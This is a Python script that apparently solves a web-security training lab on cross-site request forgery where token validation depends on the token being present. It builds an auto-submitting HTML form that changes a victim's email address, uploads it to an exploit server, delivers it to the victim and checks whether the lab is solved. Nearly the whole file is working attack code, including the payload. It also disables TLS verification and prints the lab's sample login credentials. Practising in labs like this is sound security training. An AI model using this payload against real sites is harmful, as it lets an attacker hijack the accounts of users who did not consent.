import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def csrf_attack(url, exploit_server):
    # PAYLOAD
    payload = '<html><body><form action="{0}/my-account/change-email" method="POST"><input required type="email" name="email" value="victim@yougotdefinitlyhacked"><button type="submit">Update email</button><script>document.forms[0].submit()</script></body></html>'.format(url)

    # STORE PAYLOAD ON EXPLOIT SERVER
    params = {
        'urlIsHttps' : 'on',
        'responseFile' : '/exploit',
        'responseHead' : 'HTTP/1.1 200 OK Content-Type: text/html; charset=utf-8',
        'responseBody' : payload,
        'formAction' : 'STORE'
    }

    r = requests.post(exploit_server, data=params, verify=False, proxies=proxies)
    if r.status_code != 200:
        print("[-] Could not store the payload")
        sys.exit(-1)

    # DELIVER TO VICTIM
    params['formAction'] = 'DELIVER_TO_VICTIM'
    
    r = requests.post(exploit_server, data=params, verify=False, proxies=proxies)
    if r.status_code != 200:
        print("[-] Could not deliver payload")
        sys.exit(-1)

    # CHECK IF EXPLOIT SUCCEEDED
    r = requests.get(url, verify=False, proxies=proxies)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Exploit successful! Lab solved")

def main():
    if len(sys.argv) != 3:
        print("[-] Usage: %s <url1> <url2>" % sys.argv[0])
        print("[-] Example: %s www.vulnerable-website.com www.exploit-server.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1].strip()
    exploit_server = sys.argv[2].strip()

    print("[+] Lab: CSRF where token validation depends on token being present")
    print("""[+] This lab's email change functionality is vulnerable to CSRF.
    To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
You can log in to your own account using the following credentials: wiener:peter""")

    csrf_attack(url, exploit_server)

if __name__ == "__main__":
    main()